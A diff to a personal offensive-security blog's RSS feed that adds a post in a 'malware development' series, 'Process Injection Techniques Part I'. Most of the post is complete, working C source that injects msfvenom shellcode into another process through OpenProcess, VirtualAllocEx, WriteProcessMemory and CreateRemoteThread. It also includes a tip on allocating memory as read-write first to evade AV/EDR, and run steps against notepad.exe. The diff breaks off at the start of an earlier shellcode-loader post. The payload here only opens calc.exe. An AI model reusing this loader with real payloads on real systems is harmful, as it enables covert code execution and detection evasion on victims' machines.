@@ -1,4 +1,185 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>k0shane</title><description>Offensive Security Stuff</description><link>https://k0shane.github.io/</link><language>en</language><item><title>0x00 - Simple Shellcode Loader with C</title><link>https://k0shane.github.io/posts/maldev/0x0-basic-shellcode-injection/</link><guid isPermaLink="true">https://k0shane.github.io/posts/maldev/0x0-basic-shellcode-injection/</guid><pubDate>Sat, 15 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;In this module, we&apos;re gonna write a simple shellcode loader also known as local shellcode injection using C and Win32 API. If I get enough free time, I&apos;ll continue this as a malware development series. So let&apos;s start with a basic one.&lt;/p&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>k0shane</title><description>Offensive Security Stuff</description><link>https://k0shane.github.io/</link><language>en</language><item><title>0x01 - Process Injection Techniques Part I</title><link>https://k0shane.github.io/posts/maldev/0x1-process-injection/</link><guid isPermaLink="true">https://k0shane.github.io/posts/maldev/0x1-process-injection/</guid><pubDate>Tue, 18 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;Intro&lt;/h3&gt;
+&lt;p&gt;So after writing local shellcode injection, now let&apos;s inject our shellcode into remote process which is also called process injection. We can inject our shellcode into other process such as &lt;code&gt;notepad.exe&lt;/code&gt;, &lt;code&gt;explorer.exe&lt;/code&gt;, etc...&lt;/p&gt;
+&lt;p&gt;To inject shellcode into other process, we&apos;re gonna need these WinAPI.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess&quot;&gt;OpenProcess&lt;/a&gt; - To open a process with specific PID&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex&quot;&gt;VirtualAllocEx&lt;/a&gt; - Same as &lt;code&gt;VirtualAlloc&lt;/code&gt; but it allow us for allocating memory for remote process.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory&quot;&gt;WriteProcessMemory&lt;/a&gt; - To write our shellcode into remote process&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex&quot;&gt;VirtualProtectEx&lt;/a&gt; - To change memory region to be executable&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread&quot;&gt;CreateRemoteThread&lt;/a&gt; - Similar to &lt;code&gt;CreateThread&lt;/code&gt; but for remote thread.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let review the source code first to get better vision.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;Tlhelp32.h&amp;gt;
+
+// msfvenom -p windows/x64/exec CMD=calc.exe -f c 
+unsigned char pShellcode[] = {
+	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
+	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
+	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
+	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
+	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
+	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
+	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
+	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
+	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
+	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
+	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
+	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
+	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
+	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
+	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
+	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
+	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
+	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
+	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
+	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
+	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
+};
+
+// we create a function called InjectRemoteProcess
+BOOL InjectRemoteProcess(DWORD Pid, PBYTE pShellcode, SIZE_T pShellcodeSize) {
+	// open process to specify Pid
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
+	if (hProcess == NULL) {
+		printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+	printf(&quot;[i] OpenProcess to PID: %i \n&quot;, Pid);
+
+	// allocating memory into a specific process id that you supply
+	PVOID pShellcodeAddress = VirtualAllocEx(hProcess, NULL, pShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	if (pShellcodeAddress == NULL) {
+		printf(&quot;[!] VirtualAllocEx Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+	printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, pShellcodeAddress);
+
+	// write our shellcode into allocated memory
+	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, pShellcodeSize, NULL)) {	
+		printf(&quot;[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+	printf(&quot;[i] Write shellcode to 0x%p\n&quot;, pShellcodeAddress);
+
+	// change to PAGE_EXECUTE_READWRITE
+	DWORD dwOldProtection = NULL;
+	if (!VirtualProtectEx(hProcess,pShellcodeAddress,pShellcodeSize, PAGE_EXECUTE_READWRITE,&amp;amp;dwOldProtection)) {
+		printf(&quot;[!] VirtualProtectEx Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	// create new thread into remote process
+	printf(&quot;[i] Create remote thread to execute payload\n&quot;);
+	HANDLE hRemoteThread = CreateRemoteThread(hProcess,NULL,0, pShellcodeAddress,NULL,0,NULL);
+	if (hRemoteThread == NULL) {
+		printf(&quot;[!] CreateRemoteThread Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+	printf(&quot;[i] Done\n&quot;);
+
+	CloseHandle(hProcess);
+	CloseHandle(hRemoteThread);
+	return TRUE;
+}
+
+int main(int argc, char* argv[]) {
+	if (argc &amp;lt; 2) {
+		printf(&quot;[!] Usage : \&quot;%s\&quot; &amp;lt;Process ID&amp;gt; \n&quot;, argv[0]);
+		return -1;
+	}
+
+	int Pid = atoi(argv[1]);
+	SIZE_T pShellcodeSize = sizeof(pShellcode);
+	// calling the function
+	if (!(InjectRemoteProcess(Pid, pShellcode, pShellcodeSize))) {
+		return -1;
+	}
+	return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;OpenProcess&lt;/h3&gt;
+&lt;p&gt;You might familar writing Window API from the first post. First we created a function called &lt;code&gt;InjectRemoteProcess&lt;/code&gt;. Function parameters will be processID, shellcode and shellcode size.&lt;/p&gt;
+&lt;p&gt;The first API will be &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess&quot;&gt;OpenProcess&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;HANDLE OpenProcess(
+  [in] DWORD dwDesiredAccess,
+  [in] BOOL  bInheritHandle,
+  [in] DWORD dwProcessId
+);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This is a new one. We use it to open a process in a specific &lt;code&gt;Pid&lt;/code&gt; that we have to supply as a argument like &lt;code&gt;.\ProcessInjection 1337&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;We used &lt;code&gt;PROCESS_ALL_ACCESS&lt;/code&gt; for &lt;code&gt;dwDesiredAccess&lt;/code&gt; parameter as per &lt;code&gt;MSDN&lt;/code&gt; page.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/maldev/maldev2.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;And &lt;code&gt;FALSE&lt;/code&gt; for &lt;code&gt;bInheritHandle&lt;/code&gt; since we don&apos;t want to inherit of any child of current process. We can use &lt;code&gt;FALSE&lt;/code&gt; for process injection. &lt;code&gt;dwProcessId&lt;/code&gt; will be our &lt;code&gt;Pid&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
+if (hProcess == NULL) {
+    printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
+    return FALSE;
+}
+printf(&quot;[i] OpenProcess to PID: %i \n&quot;, Pid);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;VirtualAllocEx&lt;/h3&gt;
+&lt;p&gt;As I said above, this is similar to &lt;code&gt;VirtualAlloc&lt;/code&gt; from the first post, &lt;code&gt;VirtualAllocEx&lt;/code&gt; is for allocating memory from a remote process. We just used &lt;code&gt;PAGE_READWRITE&lt;/code&gt; in here for a moment to avoid high entropy of AV/EDR. We will change this &lt;code&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt; later using &lt;code&gt;VirtualProtectEx&lt;/code&gt; API. Now our code will be look like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PVOID pShellcodeAddress = VirtualAllocEx(hProcess, NULL, pShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+if (pShellcodeAddress == NULL) {
+    printf(&quot;[!] VirtualAllocEx Failed With Error : %d \n&quot;, GetLastError());
+    return FALSE;
+}
+printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, pShellcodeAddress);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Another new API is &lt;code&gt;WriteProcessMemory&lt;/code&gt; which for writing our shellcode into allocated memory to a remote process.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;BOOL WriteProcessMemory(
+  [in]  HANDLE  hProcess,
+  [in]  LPVOID  lpBaseAddress,
+  [in]  LPCVOID lpBuffer,
+  [in]  SIZE_T  nSize,
+  [out] SIZE_T  *lpNumberOfBytesWritten
+);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;hProcess&lt;/code&gt; is handle of our &lt;code&gt;OpenProcess&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;lpBaseAddress&lt;/code&gt; will be our &lt;code&gt;pShellcodeAddress&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;lpBuffer&lt;/code&gt; is our &lt;code&gt;pShellcode&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;nSize&lt;/code&gt; is the size of our shellcode &lt;code&gt;pShellcodeSize&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;lpNumberOfBytesWritten&lt;/code&gt; we can set &lt;code&gt;NULL&lt;/code&gt; for this.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, pShellcodeSize, NULL)) {	
+    printf(&quot;[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
+    return FALSE;
+}
+printf(&quot;[i] Write shellcode to 0x%p\n&quot;, pShellcodeAddress);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;VirtualProtectEx&lt;/code&gt; and &lt;code&gt;CreateRemoteThread&lt;/code&gt; are the same as from the first post.&lt;/p&gt;
+&lt;p&gt;At the end we have to close our handle.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;CloseHandle(hProcess);
+CloseHandle(hRemoteThread);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After that we can call this &lt;code&gt;InjectRemoteProcess&lt;/code&gt; function from our main.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int main(int argc, char* argv[]) {
+
+  // checking arguments
+  if (argc &amp;lt; 2) {
+    printf(&quot;[!] Usage : \&quot;%s\&quot; &amp;lt;Process ID&amp;gt; \n&quot;, argv[0]);
+    return -1;
+  }
+  // atoi for converting string to integer
+  int Pid = atoi(argv[1]);
+  // declare the size of the shellcode
+  SIZE_T pShellcodeSize = sizeof(pShellcode);
+  // calling the function
+  if (!(InjectRemoteProcess(Pid, pShellcode, pShellcodeSize))) {
+    return -1;
+  }
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now compile the code in visual studio, open a &lt;code&gt;notepad.exe&lt;/code&gt;, find its process ID using &lt;code&gt;Process Hacker&lt;/code&gt; tool and run it.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/maldev/maldev3.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>0x00 - Simple Shellcode Loader with C</title><link>https://k0shane.github.io/posts/maldev/0x0-basic-shellcode-injection/</link><guid isPermaLink="true">https://k0shane.github.io/posts/maldev/0x0-basic-shellcode-injection/</guid><pubDate>Sat, 15 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;In this module, we&apos;re gonna write a simple shellcode loader also known as local shellcode injection using C and Win32 API. If I get enough free time, I&apos;ll continue this as a malware development series. So let&apos;s start with a basic one.&lt;/p&gt;
 &lt;p&gt;To load our shellcode (&lt;code&gt;from msfvenom&lt;/code&gt;), we&apos;re gonna need these window APIs.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc&quot;&gt;VirtualAlloc&lt;/a&gt; - Allocate memory for our shellcode&lt;/li&gt;
